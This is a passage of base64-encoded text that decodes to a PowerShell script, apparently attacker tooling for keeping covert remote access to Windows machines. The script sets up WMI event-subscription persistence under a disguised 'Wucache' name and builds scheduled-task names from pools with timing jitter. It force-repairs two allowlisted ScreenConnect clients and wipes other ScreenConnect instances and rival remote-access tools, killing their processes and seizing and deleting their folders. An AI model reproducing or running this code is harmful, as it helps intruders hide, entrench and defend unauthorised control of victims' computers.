TVBVVEVSTkFNRS5Ub1VwcGVyKCkuVG9DaGFyQXJyYXkoKSkgeyAkcyA9ICgkcyAqIDMxICsgW2lu
dF0kYykgJSAxMDAwMDAwMDA3IH0NCiAgICByZXR1cm4gJHMNCn0NCg0KZnVuY3Rpb24gUmVhZC1J
ZGVudGl0eSB7DQogICAgJGlkID0gJERlZmF1bHRzLkNsb25lKCkNCiAgICBpZiAoVGVzdC1QYXRo
ICRjZmdQYXRoKSB7DQogICAgICAgIGZvcmVhY2ggKCRsaW5lIGluIChHZXQtQ29udGVudCAtTGl0
ZXJhbFBhdGggJGNmZ1BhdGggLUZvcmNlKSkgew0KICAgICAgICAgICAgaWYgKCRsaW5lIC1tYXRj
aCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZFskbWF0Y2hlc1sxXV0gPSAk
bWF0Y2hlc1syXSB9DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICRpZA0KfQ0KDQpmdW5j
dGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7DQogICAgaWYgKCR0bikgeyAmIHNj
aHRhc2tzLmV4ZSAvRGVsZXRlIC9UTiAkdG4gL0YgMj4mMSB8IE91dC1OdWxsIH0NCn0NCg0KZnVu
Y3Rpb24gSW5pdGlhbGl6ZS1JZGVudGl0eSB7DQogICAgIyBJZGVtcG90ZW50IHdpdGhpbiBhbiBJ
REVOVFZFUiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6DQogICAgIyBv
bGQtbmFtZSB0YXNrcyBhcmUgZGVsZXRlZCwgdGhlbiBpZGVudGl0eSBpcyByZWdlbmVyYXRlZCBm
cm9tIHRoZSBzYW1lIHNlZWQuDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgew0KICAgICAg
ICAkb2xkID0gUmVhZC1JZGVudGl0eQ0KICAgICAgICBpZiAoJG9sZFsnSURFTlRWRVInXSAtZXEg
IiRJZGVudFZlcnNpb24iKSB7IHJldHVybiAkb2xkIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4g
J1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tfRCcpIHsgUmVtb3ZlLVRhc2tRdWlldCAk
b2xkWyRrXSB9DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtRm9y
Y2UNCiAgICB9DQogICAgJHMgPSBHZXQtSG9zdFNlZWQNCiAgICAjIEw0OiB0d28gc2xvdHMgbWF5
IGhhc2ggdG8gdGhlIHNhbWUgdGFzayBwYXRoIChwb29scyBzaGFyZSBuYW1lcykgLT4NCiAgICAj
IG9uZSBwaHlzaWNhbCB0YXNrIHRoZW4gc2F0aXNmaWVzIHR3byBzbG90cyBhbmQgdGhlIGZsZWV0
IHNob3dzIDMvNC4NCiAgICAjIFdhbGsgZWFjaCBwb29sIGZvcndhcmQgdW50aWwgdGhlIHBpY2sg
aXMgdW5pcXVlIGFjcm9zcyBzbG90cy4NCiAgICAkcGljayA9IFtvcmRlcmVkXUB7fQ0KICAgIGZv
cmVhY2ggKCRzbG90IGluIEAoQCgnQScsICRzICUgOCksIEAoJ0InLCAoJHMgKyAzKSAlIDgpLCBA
KCdDJywgKCRzICsgNSkgJSA4KSwgQCgnRCcsICgkcyArIDcpICUgOCkpKSB7DQogICAgICAgICRs
ZXR0ZXIgPSBbc3RyaW5nXSRzbG90WzBdOyAkaSA9IFtpbnRdJHNsb3RbMV0NCiAgICAgICAgJG5h
bWUgPSAkUG9vbHNbJGxldHRlcl1bJGldDQogICAgICAgICRuID0gMA0KICAgICAgICB3aGlsZSAo
JHBpY2suVmFsdWVzIC1jb250YWlucyAkbmFtZSAtYW5kICRuIC1sdCA4KSB7ICRpID0gKCRpICsg
MSkgJSA4OyAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV07ICRuKysgfQ0KICAgICAgICAkcGlj
a1skbGV0dGVyXSA9ICRuYW1lDQogICAgfQ0KICAgICRjZmcgPSBAKA0KICAgICAgICAiVEFTS19B
PSQoJHBpY2suQSkiDQogICAgICAgICJUQVNLX0I9JCgkcGljay5CKSINCiAgICAgICAgIlRBU0tf
Qz0kKCRwaWNrLkMpIg0KICAgICAgICAiVEFTS19EPSQoJHBpY2suRCkiDQogICAgICAgICJNT19B
PSQoMiArICgkcyAlIDQpKSIgICAgICAgICAgIyAyLTUgbWluIGppdHRlcg0KICAgICAgICAiTU9f
Qj0kKDMgKyAoKCRzICsgMSkgJSAzKSkiICAgICMgMy01IG1pbiBqaXR0ZXINCiAgICAgICAgIlNF
RUQ9JHMiDQogICAgICAgICJJREVOVFZFUj0kSWRlbnRWZXJzaW9uIg0KICAgICkNCiAgICBTZXQt
Q29udGVudCAtTGl0ZXJhbFBhdGggJGNmZ1BhdGggLVZhbHVlICRjZmcgLUZvcmNlDQogICAgcmV0
dXJuIChSZWFkLUlkZW50aXR5KQ0KfQ0KDQpmdW5jdGlvbiBJbnN0YWxsLVdhdGNoZG9nIHsNCiAg
ICBpZiAoLW5vdCAkTW9uUGF0aCkgeyByZXR1cm4gJGZhbHNlIH0NCiAgICAkb2sgPSAkdHJ1ZQ0K
ICAgIHRyeSB7DQogICAgICAgIFNldC1XbWlJbnN0YW5jZSAtTmFtZXNwYWNlIHJvb3Rcc3Vic2Ny
aXB0aW9uIC1DbGFzcyBfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbiBgDQogICAgICAgICAgICAt
QXJndW1lbnRzIEB7IFRpbWVySWQgPSAnV3VjYWNoZVdhdGNoZG9nJzsgSW50ZXJ2YWxNaWxsaXNl
Y29uZHMgPSAxODAwMDA7IFNraXBJZlBhc3NlZCA9ICRmYWxzZSB9IHwgT3V0LU51bGwNCiAgICAg
ICAgJGYgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xh
c3MgX19FdmVudEZpbHRlciBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3Vj
YWNoZVdhdGNoZG9nRic7IEV2ZW50TmFtZXNwYWNlID0gJ3Jvb3RcY2ltdjInOyBRdWVyeUxhbmd1
YWdlID0gJ1dRTCc7DQogICAgICAgICAgICAgICAgICAgICAgICAgIFF1ZXJ5ID0gIlNFTEVDVCAq
IEZST00gX19UaW1lckV2ZW50IFdIRVJFIFRpbWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIH0NCiAg
ICAgICAgJGMgPSBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAt
Q2xhc3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIGANCiAgICAgICAgICAgIC1Bcmd1bWVudHMg
QHsgTmFtZSA9ICdXdWNhY2hlV2F0Y2hkb2dDJzsgQ29tbWFuZExpbmVUZW1wbGF0ZSA9ICJjbWQu
ZXhlIC9jIGAiJE1vblBhdGhgIiI7IFJ1bkludGVyYWN0aXZlbHkgPSAkZmFsc2UgfQ0KICAgICAg
ICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgX19G
aWx0ZXJUb0NvbnN1bWVyQmluZGluZyBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IEZpbHRl
ciA9ICRmOyBDb25zdW1lciA9ICRjIH0gfCBPdXQtTnVsbA0KICAgIH0gY2F0Y2ggeyAkb2sgPSAk
ZmFsc2UgfQ0KICAgIHJldHVybiAkb2sNCn0NCg0KZnVuY3Rpb24gRW5zdXJlLVdhdGNoZG9nIHsN
CiAgICAkYyA9IEdldC1XbWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xh
c3MgQ29tbWFuZExpbmVFdmVudENvbnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRv
Z0MnIg0KICAgIGlmICgkbnVsbCAtZXEgJGMpIHsNCiAgICAgICAgSW5zdGFsbC1XYXRjaGRvZyB8
IE91dC1OdWxsDQogICAgICAgIHJldHVybiAnUkVBUk1FRCcNCiAgICB9DQogICAgcmV0dXJuICdP
SycNCn0NCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lzdGVyZWQoW3N0cmluZ10kRmluZ2VycHJpbnQp
IHsNCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICdubycgfQ0KICAgICRuYW1l
ID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgIGZvcmVhY2ggKCRy
b290IGluICdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxV
bmluc3RhbGwnLA0KICAgICAgICAgICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMy
Tm9kZVxDdXJyZW50VmVyc2lvblxVbmluc3RhbGwnKSB7DQogICAgICAgIEdldC1DaGlsZEl0ZW0g
JHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
ICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1BhdGgpLkRpc3BsYXlOYW1l
DQogICAgICAgICAgICBpZiAoJGRuIC1hbmQgJGRuIC1saWtlICIqJG5hbWUqIiAtYW5kICRfLlBT
Q2hpbGROYW1lIC1saWtlICd7Kn0nKSB7IHJldHVybiAneWVzJyB9DQogICAgICAgIH0NCiAgICB9
DQogICAgcmV0dXJuICdubycNCn0NCg0KZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShbc3RyaW5n
XSRGaW5nZXJwcmludCkgew0KICAgICMgUmVjcmVhdGVzIGEgZGVsZXRlZCBTQyBzZXJ2aWNlIGVu
dHJ5IGJ5IHJlcGFpcmluZyB0aGUgUkVHSVNURVJFRCBwcm9kdWN0Lg0KICAgICMgbXNpZXhlYyAv
ZmEge0dVSUR9IHJlcGFpcnMgaW4gcGxhY2UgLSBpdCBkb2VzIE5PVCBydW4gdGhlIFNDLWZhbWls
eQ0KICAgICMgbWFqb3ItdXBncmFkZSByZW1vdmFsLCBzbyBvdGhlciBpbnN0YW5jZXMgYXJlIHVu
dG91Y2hlZC4NCiAgICAjIEw1OiBhbHNvIGhhbmRsZXMgcHJlc2VudC1idXQtU1RPUFBFRCBzZXJ2
aWNlcyAocmVwYWlyIHJlc3RvcmVzIGJpbmFyaWVzLA0KICAgICMgdGhlbiBzdGFydCkuIE9ubHkg
YSBSdW5uaW5nIHNlcnZpY2UgaXMgY29uc2lkZXJlZCBoZWFsdGh5Lg0KICAgIGlmICgtbm90ICRG
aW5nZXJwcmludCkgeyByZXR1cm4gJ25vLWZwJyB9DQogICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVj
dCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRu
YW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRzdmMgLWFuZCAkc3Zj
LlN0YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJ1bm5pbmcnIH0NCiAgICAkZ3Vp
ZCA9ICRudWxsDQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29m
dFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgICAgICAgICAgICAgICAg
ICAgJ0hLTE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcp
IHsNCiAgICAgICAgR2V0LUNoaWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3Bl
cnR5ICRfLlBTUGF0aCkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4g
LWxpa2UgIiokbmFtZSoiIC1hbmQgJF8uUFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpIHsgJGd1aWQg
PSAkXy5QU0NoaWxkTmFtZSB9DQogICAgICAgIH0NCiAgICB9DQogICAgaWYgKC1ub3QgJGd1aWQp
IHsgcmV0dXJuICdub3QtcmVnaXN0ZXJlZCcgfQ0KICAgICYgcmVnLmV4ZSBkZWxldGUgJ0hLTE1c
U09GVFdBUkVcUG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxl
TVNJIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgICYgcmVnLmV4ZSBhZGQgJ0hLTE1cU09GVFdBUkVc
UG9saWNpZXNcTWljcm9zb2Z0XFdpbmRvd3NcSW5zdGFsbGVyJyAvdiBEaXNhYmxlTVNJIC90IFJF
R19EV09SRCAvZCAwIC9mIDI+JjEgfCBPdXQtTnVsbA0KICAgICRsb2cgPSBKb2luLVBhdGggJFdv
cmtEaXIgIm1zaV9yZXBhaXJfJEZpbmdlcnByaW50LmxvZyINCiAgICAkcCA9IFN0YXJ0LVByb2Nl
c3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL2ZhICRndWlkIC9xbiAvbm9yZXN0YXJ0IC9M
KnYgYCIkbG9nYCIiIC1XYWl0IC1QYXNzVGhydQ0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDgN
CiAgICAmIHNjLmV4ZSBjb25maWcgIiRuYW1lIiBzdGFydD0gYXV0byAyPiYxIHwgT3V0LU51bGwN
CiAgICAmIHNjLmV4ZSBzdGFydCAiJG5hbWUiIDI+JjEgfCBPdXQtTnVsbA0KICAgIFN0YXJ0LVNs
ZWVwIC1TZWNvbmRzIDQNCiAgICAkc3ZjID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBpZiAoJHN2YyAtYW5kICRzdmMuU3RhdHVzIC1l
cSAnUnVubmluZycpIHsgcmV0dXJuICJzdmMtcmVzdG9yZWQgZXhpdD0kKCRwLkV4aXRDb2RlKSIg
fQ0KICAgIGlmICgkc3ZjKSB7IHJldHVybiAic3ZjLXN0aWxsLXN0b3BwZWQgZXhpdD0kKCRwLkV4
aXRDb2RlKSIgfQ0KICAgIHJldHVybiAic3ZjLXN0aWxsLW1pc3NpbmcgZXhpdD0kKCRwLkV4aXRD
b2RlKSINCn0NCg0KZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRlIHsNCiAgICAjIFRydWUgcmVt
b3ZhbCBvZiBldmVyeXRoaW5nIHJlbW90ZS1hY2Nlc3MgZXhjZXB0IHRoZSB0d28gYWxsb3dsaXN0
ZWQNCiAgICAjIFNjcmVlbkNvbm5lY3QgaW5zdGFuY2VzLiBPcmRlciBtYXR0ZXJzOiBwcm9kdWN0
cyBmaXJzdCAoY2xlYW4gTVNJDQogICAgIyB1bmluc3RhbGwpLCB0aGVuIHNlcnZpY2VzLCBwcm9j
ZXNzZXMsIGFuZCBsZWZ0b3ZlciBkaXJzLg0KICAgICRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIg
J2V4dGVybWluYXRlLmxvZycNCiAgICAka2VlcCA9IEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYx
YzgxNDBkNDUzNDI3JykNCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAwOyBkaXIgPSAwOyBw
cm9kdWN0ID0gMDsgcm1tID0gMCB9DQogICAgZnVuY3Rpb24gTG9nKFtzdHJpbmddJG0pIHsgQWRk
LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgiezB9IHsxfSIgLWYgKEdldC1EYXRl
IC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06c3MnKSwgJG0pIC1FcnJvckFjdGlvbiBTaWxlbnRs
eUNvbnRpbnVlIH0NCiAgICBmdW5jdGlvbiBJcy1LZWVwZXIoW3N0cmluZ10kcykgeyBmb3JlYWNo
ICgkayBpbiAka2VlcCkgeyBpZiAoJHMgLWxpa2UgIiokayoiKSB7IHJldHVybiAkdHJ1ZSB9IH07
IHJldHVybiAkZmFsc2UgfQ0KDQogICAgIyAxLiBmb3JlaWduIFNDIHByb2R1Y3RzOiB0cnVlIE1T
SSB1bmluc3RhbGwgKHN0b3BzL3JlbW92ZXMgY2xlYW5seSkNCiAgICBmb3JlYWNoICgkcm9vdCBp
biAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0
YWxsJywNCiAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVc
Q3VycmVudFZlcnNpb25cVW5pbnN0YWxsJykgew0KICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAg
ICAgICAgJGRuID0gKEdldC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoKS5EaXNwbGF5TmFtZQ0KICAg
ICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbWF0Y2ggJ1NjcmVlbkNvbm5lY3QgQ2xpZW50IFwo
KFswLTlhLWZdezE2fSlcKScgLWFuZCAtbm90IChJcy1LZWVwZXIgJGRuKSAtYW5kICRfLlBTQ2hp
bGROYW1lIC1saWtlICd7Kn0nKSB7DQogICAgICAgICAgICAgICAgJHAgPSBTdGFydC1Qcm9jZXNz
IG1zaWV4ZWMuZXhlIC1Bcmd1bWVudExpc3QgIi94ICQoJF8uUFNDaGlsZE5hbWUpIC9xbiAvbm9y
ZXN0YXJ0IiAtV2FpdCAtUGFzc1RocnUNCiAgICAgICAgICAgICAgICAkbi5wcm9kdWN0Kys7IExv
ZyAicHJvZHVjdF91bmluc3RhbGxlZCBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIg0KICAgICAg
ICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyAyLiBmb3JlaWduIFNDIHNlcnZpY2Vz
IChsZWZ0b3ZlciBlbnRyaWVzIGFmdGVyIHVuaW5zdGFsbCwgb3IgdW5yZWdpc3RlcmVkKQ0KICAg
IGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVu
dConIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoLW5vdCAo
SXMtS2VlcGVyICRzdmMuTmFtZSkpIHsNCiAgICAgICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2
Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICBTdGFydC1TbGVlcCAtTWlsbGlz
ZWNvbmRzIDgwMA0KICAgICAgICAgICAgJiBzYy5leGUgZGVsZXRlICIkKCRzdmMuTmFtZSkiIDI+
JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgJG4uc3ZjKys7IExvZyAic3ZjX2RlbGV0ZWQgJCgk
c3ZjLk5hbWUpIg0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyAzLiBmb3JlaWduIFNDIHByb2Nl
c3NlcyBieSBleGVjdXRhYmxlIHBhdGgNCiAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2Vz
cyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRleGUgPSAkXy5FeGVjdXRh
YmxlUGF0aA0KICAgICAgICBpZiAoJGV4ZSAtYW5kIC1ub3QgKElzLUtlZXBlciAkZXhlKSkgew0K
ICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkXy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAkbi5wcm9jKys7IExvZyAicHJvY19r
aWxsZWQgJGV4ZSINCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0
YWxsIGRpcnMNCiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6UHJvZ3JhbUZpbGVzLCAke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAgICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90
IChUZXN0LVBhdGggJGJhc2UpKSB7IGNvbnRpbnVlIH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAt
TGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAtRmlsdGVyICdTY3JlZW5Db25uZWN0KicgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAg
ICAkZCA9ICRfLkZ1bGxOYW1lDQogICAgICAgICAgICBpZiAoLW5vdCAoSXMtS2VlcGVyICRkKSkg
ew0KICAgICAgICAgICAgICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIg
Ik5hbWUgbGlrZSAnU2NyZWVuQ29ubmVjdCUnIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8DQogICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLkV4ZWN1dGFibGVQYXRo
IC1saWtlICIkZCoiIH0gfA0KICAgICAgICAgICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0
b3AtUHJvY2VzcyAtSWQgJF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
b250aW51ZSB9DQogICAgICAgICAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+
JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3JhbnQgJ0Fk
bWluaXN0cmF0b3JzOkYnIC9UIC9DIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAgICAgICAgIFJl
bW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNp
bGVudGx5Q29udGludWUNCiAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRkKSB7IFN0YXJ0
LVNsZWVwIC1TZWNvbmRzIDI7IFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZCAtUmVjdXJzZSAt
Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfQ0KICAgICAgICAgICAgICAgIGlm
IChUZXN0LVBhdGggJGQpIHsgTG9nICJkaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfSBlbHNlIHsgJG4u
ZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0K
ICAgIH0NCg0KICAgICMgNS4gZGlzYWxsb3dlZCBSTU0gdG9vbHM6IHByb2R1Y3RzLCBzZXJ2aWNl
cywgcHJvY2Vzc2VzLCBkaXJzDQogICAgJHJtbSA9IEAoDQogICAgICAgIEB7IFRhZz0nQW55RGVz
ayc7ICAgICBTdmM9QCgnQW55RGVzaycpOyBQcm9jPUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2si
LCIkZW52OlByb2dyYW1EYXRhXEFueURlc2siKTsgUHJvZD1AKCdBbnlEZXNrKicpIH0NCiAgICAg
ICAgQHsgVGFnPSdUZWFtVmlld2VyJzsgIFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1Rl
YW1WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9
DQogICAgICAgIEB7IFRhZz0nTWVzaEFnZW50JzsgICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hB
Z2VudCcsJ01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbCon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50KicpIH0NCiAgICAgICAg
QHsgVGFnPSdTcGxhc2h0b3AnOyAgIFN2Yz1AKCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NV
U2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcConLCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNwbGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdTcGxhc2h0b3AqJykgfQ0KICAgICAgICBAeyBU
YWc9J0xvZ01lSW4nOyAgICAgU3ZjPUAoJ0xvZ01lSW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWln
bml0aW9uJyk7IFByb2M9QCgnTG9nTWVJbionLCdMTUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMb2dNZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dNZUluKicpIH0NCiAgICAgICAgQHsgVGFnPSdHb1Rv
JzsgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicp
OyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XEdvVG9NeVBDIiwiJGVudjpQcm9ncmFtRmlsZXNcR29Ub0Fzc2lzdCoiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cR29Ub0Fzc2lzdCoiKTsgUHJvZD1AKCdHb1RvTXlQQyonLCdHb1Rv
QXNzaXN0KicpIH0NCiAgICAgICAgQHsgVGFnPSdDb25uZWN0V2lzZSc7IFN2Yz1AKCdMVFNlcnZp
Y2UnLCdMVFN2Y01vbicpOyBQcm9jPUAoJ0xUU3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52
OndpbmRpclxMVFN2YyIpOyBQcm9kPUAoJ0Nvbm5lY3RXaXNlKicsJ0xhYlRlY2gqJykgfQ0KICAg
ICAgICBAeyBUYWc9J0F0ZXJhJzsgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQnKTsgUHJvYz1AKCdB
dGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJBIE5ldHdvcmtzIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIik7IFByb2Q9QCgnQXRlcmEq
JykgfQ0KICAgICAgICBAeyBUYWc9J05pbmphUk1NJzsgICAgU3ZjPUAoJ05pbmphUk1NQWdlbnQn
LCduaW5qYXJtbSonKTsgUHJvYz1AKCdOaW5qYVJNTUFnZW50KicsJ25pbmphcm1tKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1NQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFcTmluamFSTU1BZ2VudCIpOyBQ
cm9kPUAoJ05pbmphUk1NKicpIH0NCiAgICAgICAgQHsgVGFnPSdEYXR0byc7ICAgICAgIFN2Yz1A
KCdDZW50cmFTdGFnZScsJ0NhZ1NlcnZpY2UnKTsgUHJvYz1AKCdDZW50cmFTdGFnZSonLCdEYXR0
b1JNTSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xDZW50cmFTdGFnZSIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxDZW50cmFTdGFnZSIpOyBQcm9kPUAoJ0RhdHRvKicsJ0NlbnRyYVN0
YWdlKicpIH0NCiAgICAgICAgQHsgVGFnPSdSdXN0RGVzayc7ICAgIFN2Yz1AKCdSdXN0RGVzaycs
J3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
